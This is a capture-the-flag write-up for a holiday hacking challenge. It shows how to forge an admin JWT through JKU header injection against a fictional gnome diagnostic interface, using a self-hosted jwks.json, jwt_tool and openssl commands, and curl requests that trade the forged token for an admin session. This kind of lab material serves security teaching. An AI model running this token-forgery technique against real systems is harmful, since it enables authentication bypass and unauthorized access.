---
layout: default
title: act2_rogue-gnome-identity-provider_srt
nav: |
  <table>
  <thead>
  <tr>
  <th><a href="/HHC_2025/act2_dosis-network-down_srt.html">Previous Objective: Act2 Dosis Network Down</a></th>
  <th><a href="/HHC_2025/index.html">Home Page</a></th>
  <th><a href="/HHC_2025/act2_quantgnome-leap_srt.html">Next Objective: Act2 Quantgnome Leap</a></th>
  </tr>
  </thead>
  <tbody>
  </tbody>
  </table>
---
<table>
<thead>
<tr>
<th>Objective: Rogue Gnome Identity Provider</th>
<th>Difficulty Level: 2</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?</td>
<td>Location: The Park</td>
</tr>
</tbody>
</table>
<p>
<h2>Solution Overview</h2>
<br>
</p>
Paul has tasked us with investigating a suspicious Gnome Diagnostic Interface (<code>gnome-48371.atnascorp</code>) to track down the source of malicious updates. We begin with a set of low-privilege credentials, <code>gnome:SittingOnAShelf</code>, discovered in a local <code>~/notes</code> file, which grants us basic access but restricts administrative functions.
Traffic analysis reveals that the application manages sessions via JSON Web Tokens (JWT). Inspection of the token header identifies a <code>jku</code> (JSON Key URL) parameter pointing to the trusted Identity Provider. We exploit a vulnerability in the token validation logic by performing a "JKU Header Injection" attack. We generate a malicious RSA key pair using <code>openssl</code> and host a corresponding <code>jwks.json</code> file on our attacker infrastructure. 
Using <code>jwt_tool.py</code>, we forge a new token with the <code>admin: true</code> claim, sign it with our private key, and modify the <code>jku</code> header to point to our malicious key set. Submitting this forged token grants us an administrative session cookie, allowing us to access the protected dashboard and identify the malicious <code>refrigerator-botnet.bin</code> firmware payload.
<table>
<thead>
<tr>
<th>Activity</th>
<th>Primary Tactic</th>
<th>MITRE ATT&CK Technique ID</th>
<th>MITRE ATT&CK Technique Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Extract Credentials from Notes</td>
<td>Credential Access</td>
<td>T1552.001</td>
<td>Unsecured Credentials: Credentials in Files</td>
</tr>
<tr>
<td>Generate Attack Keys</td>
<td>Resource Development</td>
<td>T1587.003</td>
<td>Develop Capabilities: Digital Certificates</td>
</tr>
<tr>
<td>Forge Admin JWT</td>
<td>Credential Access</td>
<td>T1606</td>
<td>Forge Web Credentials</td>
</tr>
<tr>
<td>Authenticate with Token</td>
<td>Defense Evasion</td>
<td>T1550.001</td>
<td>Use Alternate Authentication Material: Application Access Token</td>
</tr>
</tbody>
</table>
<p>
<h2>Detailed Solution</h2>
<br>
</p>
<details>
<summary>Click to expand</summary>
<br>
The <code>notes</code> file provided in our terminal provides steps for the usage of <code>curl</code> in accessing and authenticating to the diagnostic interface's login page. 
<p>
Following these steps gives us the following JWT:
<br>
</p>
<pre><code class="language-">
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTgyNjEyOCwiZXhwIjoxNzY1ODMzMzI4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.zQ-vWlpDZwu7mU39dkQazqU6T7iDWzmzYqxLqEMNxYddfWIo41XmjNCQkGiqhN7xNUTc6nF4S6ugTMGJyKWOz-Cqp4i3MXqr52D7GrfA8F_TnjZgcL9xsG0MWYVwuGpb70gyODBIeTyhGjHaKnmVJwJ_GMTpFPsHCx65-E2m8EG2b-eSj0GYL-AaRch63S8B1NVkqInqbFxrpcgyV9FFStpIx-eNBFdV3dbtPfbCDedA_bu_eWPitFviZSMgHYDhRo39dLWjGYY5lJRW3d9MD9bJDg9Cz5e9HGlLVNYzG4kXU4FonwBYQ9lKk9o6Xw8GErjXicwAyziC0GHbBY_ULA
</code></pre>
<p>
With the following session cookie:
<br>
</p>
<pre><code class="language-">
eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aUBekg.AWZ-ghfo4ZFDjPoR-16R7ZZoVqM
</code></pre>
Decoding the JWT with <code>jwt_tool</code> gives us the following information:
<pre><code class="language-">
=====================
Decoded Token Values:
=====================
Token header values:
[+] alg = "RS256"
[+] jku = "http://idp.atnascorp/.well-known/jwks.json"
[+] kid = "idp-key-2025"
[+] typ = "JWT"
Token payload values:
[+] sub = "gnome"
[+] iat = 1765327751    ==> TIMESTAMP = 2025-12-10 00:49:11 (UTC)
[+] exp = 1765334951    ==> TIMESTAMP = 2025-12-10 02:49:11 (UTC)
[+] iss = "http://idp.atnascorp/"
[+] admin = False
Seen timestamps:
[<em>] iat was seen
[</em>] exp is later than iat by: 0 days, 2 hours, 0 mins
----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
</code></pre>
If we <code>curl</code> the url indicated at <code>jku</code> we get the following output:
<pre><code class="language-">
{
  "keys": [
    {
      "e": "AQAB",
      "kid": "idp-key-2025",
      "kty": "RSA",
      "n": "7WWfvxwIZ44wIZqPFP9EEemmwMhKgBakYPx736W5gGD8YJlmMzanxdi8NANJ6kyMN-ErFOKJuIQn01PmAeq7On4OCwLyQpB5dHXiidZPRjb2lbrrL1k32svdeo6VGCnzdrGu6KtDHxHn8m9H3WqGVmi2OmCZsk6fJbnoklnJaFiygUkC4IMbk92cbYvajPTqV9C6yWCROPagxQFmybq1hNJoY-FRntEKwBN89Dow8d-PsGMten3CmzDQ9o8rXKs6euk9xLfX06og5Wm1aKJk686WzhtqgdmBjqt2w34EJGlEL0ZSvPdB9nPqxao83N-ah-IYeoiCnSUBKjXI-IRSjQ",
      "use": "sig"
    }
  ]
}
</code></pre>
<p>
This JWK provides the <em>public key</em> counterpart to the private key used to signed JWTs. If we want to sign our forged JWT, we need to get the private key associated with this pair. 
<br>
</p>
Another possibility is to spoof the jku of the token, which would allow us to host our own <code>jwks.json</code> file whose public/private key pair is attacker-controlled and point the token's validation functions at that key pair. This allows us to sign a token with a claim altered to show <code>admin: true</code>. 
There are essentially two steps to successfully manipulating the JWT. We execute the first command to set the header and payload claim/value pairs to our desired outcomes while signing it with our hosted <code>jwks.json</code>. We then take the JWT that results from that command and sign it with the private key that corresponds to the public key that we generated, converted into a JWKS.json file, and hosted on our server. 
<pre><code class="language-bash">
jwt_tool.py "[JWT]" -X -s -ju [HOSTED JWKS.JSON URL] -hc "admin" -hv "true" -pc "admin" -pv "true" -hc "kid" -hv "[KID VALUE]" -pc "kid" -pv "[KID VALUE]" 
jwt_tool.py "[RESULTING JWT]" -S rs256 -pr private.pem
</code></pre>
<p>
We must make sure that:
<br>
</p>
<ol>
<li>We have generated a private/public key pair <em>on our hosting server</em> for this spoofing attack:</li>
<pre><code class="language-sh">
# Generate Private Key 
openssl genrsa -out attacker_key.pem 2048 
# Extract Public Key (for the JWKS) 
openssl rsa -in attacker_key.pem -pubout -out attacker_pub.pem
</code></pre>
<li>This private key value should be copied to the challenge terminal as <code>private.pem</code></li>
<li>Our <code>jwks.json</code> is in the proper format. ensure the <code>keys</code> object is defined and used to hold the <code>jwks</code> value for spoofing:</li>
<pre><code class="language-json">
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "idp-bbvm",
      "n": "giUqG0my962a7XuacM4wV_DJkJrvoq7X_cJ_Lphp45RWeChLSwtryLis5jzRjIoTIuGiNZ6Y4M3tw-IL4z-SXjbmjUIFAaYPi-ec_333cu01dbZ_UfriB59qucHRK43uywhFH71ESm61VpKC25sajJq2gAXnYB0TVnxsBIZgLsmKFWA9cIkW510LCwesrGcVfcBFOFSKTwiWfqa0lihMBtHChg2kW7cjOjdIiB5zUxDUcM0YJijJvKQ05jx5lXAgJQgJ3mJjCey3IWmA1Ka5RdkQlSp1JtKJJ1JfkkzEqbd5nycUvTKm71pAs128OUMgl66XUWA42gFvTB65LbkhxQ",
      "e": "AQAB",
      "use": "sig"
    }
  ]
}
</code></pre>
<li>The <code>KID</code> value is present and matching between the <code>jwks.json</code> file and the spoofed JWT (see above payload). TBH this error may have been related to step 2 above but thoroughness is never a bad thing. </li>
</ol>
<p>After executing these steps and acquiring a successfully forged token that passes the system's inspection, we repeat two <code>curl</code> commands to acquire an admin's session cookie and log into the diagnostic interface. 
  </p>
<pre><code class="language-sh">
## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=[insert-JWT]
## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=[insert-session]' http://gnome-48371.atnascorp/diagnostic-interface
</code></pre>
<p>We discover <strong><code>refrigerator-botnet.bin</code></strong> being pushed via firmware update to affected devices.   </p>
</details>
<p>
<h2>Tools Reference</h2>
<br>
</p>
<table>
<thead>
<tr>
<th>Tools Used</th>
<th>Tool Version</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>jwt_tool.py</code></td>
<td>2.3.0</td>
</tr>
</tbody>
</table>
<p>
<h2>Hints Reference</h2>
<br>
</p>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>Santa</td>
<td>https://github.com/to[car[o/jwt_tool/wiki and https://portswigger.net/web-security/jwt have some great information on analyzing JWT's and performing JWT attacks.</td>
</tr>
<tr>
<td>Santa</td>
<td>It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.</td>
</tr>
</tbody>
</table>
